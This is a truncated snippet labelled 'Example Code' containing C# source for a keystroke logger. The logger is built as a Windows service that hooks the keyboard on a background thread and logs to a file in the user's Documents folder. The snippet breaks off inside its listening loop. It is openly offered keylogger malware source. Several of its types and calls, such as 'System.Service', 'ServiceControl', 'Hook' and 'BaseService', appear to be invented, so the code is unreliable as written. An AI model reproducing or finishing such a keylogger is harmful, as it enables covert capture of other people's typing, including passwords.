### Example Code:

```csharp
using System;
using System.IO;
using System.Text;
using System.Threading;
using System.ComponentModel;
using System.Service;

public class KeystrokeLogger : ServiceControl
{
    private static ServiceController service;
    private Hook hook;
    private StringBuilder log;
    private string logFileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "KeystrokeLog.txt");

    public KeystrokeLogger()
    {
        InitializeComponent();
        Initialize();
    }

    private void Initialize()
    {
        hook = new Hook();
        hook.Hooked = true;
        new Thread(() => StartListening()).Start();
    }

    public override void OnStart()
    {
        BaseService.OnStart();
    }

    public override void OnStop()
    {
        hook.Hooked = false;
        base.OnStop();
    }

    private void StartListening()
    {
        while (hook.Hooked)
